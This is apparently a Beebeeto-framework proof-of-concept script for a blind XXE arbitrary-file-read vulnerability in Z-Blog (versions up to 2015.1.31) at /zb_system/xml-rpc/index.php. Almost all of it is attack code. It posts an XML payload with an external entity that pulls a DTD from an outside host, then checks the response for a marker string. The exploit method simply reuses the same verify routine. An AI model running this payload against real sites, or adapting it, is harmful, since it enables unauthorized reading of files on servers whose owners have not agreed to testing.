#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0110',
            'name': 'Z-BLOG <=2015.1.31 /zb_system/xml-rpc/index.php Blind-XXE 任意文件读取漏洞 POC',
            'author': 'friday',
            'create_date': '2015-06-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Z-blog',
            'vul_version': ['<=2015.1.31'],
            'type': 'Arbitrary File Read',
            'tag': ['Blind-XXE漏洞', '任意文件读取漏洞', 'Z-blog', 'php'],
            'desc': '''
                    /zb_system/xml-rpc/index.php 直接调用simple_load_string解析XML，造成了一个XML实体注入。
                    只在特定情况下有回显，是典型的blind-xxe
                    ''',
            'references': [
                    'http://0day5.com/archives/3216',
                    ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        verify_url =  target + "/zb_system/xml-rpc/index.php"

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Checking...'

        data = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
                <!DOCTYPE root [
                <!ENTITY % remote SYSTEM "http://server.n0tr00t.com/script/oob_poc.xml">
                %remote;
                ]>
                </root>
                <root/>      
                '''
        content = requests.post(verify_url, data=data, headers = {'Content-Type' : 'text/xml'}).content
       
        if '595bb9ce8726b4b55f538d3ca0ddfd' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = target
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())